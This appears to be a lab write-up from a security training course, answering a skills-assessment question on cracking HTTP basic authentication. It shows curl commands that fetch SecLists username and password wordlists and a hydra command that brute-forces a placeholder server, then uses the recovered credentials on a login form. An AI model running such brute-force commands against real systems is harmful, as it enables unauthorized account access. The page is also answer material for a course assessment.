# Skills Assessment Part 1

### What is the password for the basic auth login?

**Step 1** - Download the wordlists:

* {% code overflow="wrap" %}
  ```bash
  curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt

  curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
  ```
  {% endcode %}

**Step 2** - Brute-force the login basic authentication:

* {% code overflow="wrap" %}
  ```bash
  hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt SERVER_IP http-get / -s SERVER_PORT      
  ```
  {% endcode %}
*

    <figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

### After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

**Step 1** - Use the founded credentials on the login form:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
